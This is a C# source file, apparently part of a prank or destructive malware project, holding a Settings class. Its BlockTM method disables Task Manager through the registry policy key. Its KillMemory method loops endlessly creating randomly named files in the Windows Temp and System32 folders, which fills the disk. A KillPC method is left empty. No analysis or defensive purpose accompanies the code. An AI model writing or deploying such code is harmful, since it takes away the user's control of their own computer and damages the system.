using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace bramerto_rob_2._0
{
    public class Settings
    {
        Random ran = new Random();
        public string desktop = @"C:\Users\" + Environment.UserName + @"\Desktop\WOW.jpg";
        public string temp = @"C:\Windows\Temp\W0W.jpg";
        string a = "a";
        string b = "b";
        string c = "c";
        string d = "d";
        string e = "e";
        string f = "f";
        string g = "g";
        string h = "h";
        string i = "i";
        string j = "j";
        string k = "k";
        string l = "l";
        string m = "m";
        string n = "n";
        string o = "o";
        string p = "p";
        string q = "q";
        string r = "r";
        string s = "s";
        string t = "t";
        string u = "u";
        string v = "v";
        string w = "w";
        string x = "x";
        string y = "y";
        string z = "z";
        string zero = "0";
        string one = "1";
        string two = "2";
        string three = "3";
        string four = "4";
        string five = "5";
        string six = "6";
        string seven = "7";
        string eight = "8";
        string nine = "9";

        public void BlockTM()
        {
            RegistryKey a = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (a.GetValue("DisableTaskMgr") == null)
                a.SetValue("DisableTaskMgr", "1");
        }
        public void KillMemory()
        {
           Random ran = new Random();
           var list = new List<string> { a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, zero, one, two, three, four, five, six, seven, eight, nine };
           while (true) { int index = ran.Next(list.Count); string result = $"{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}"; File.Create(@"C:\Windows\Temp\" + result + ".jpg"); File.Create(@"C:\Windows\System32\" + result + ".jpg"); }              
        }

        public void KillPC()
        {

        }
    }
}
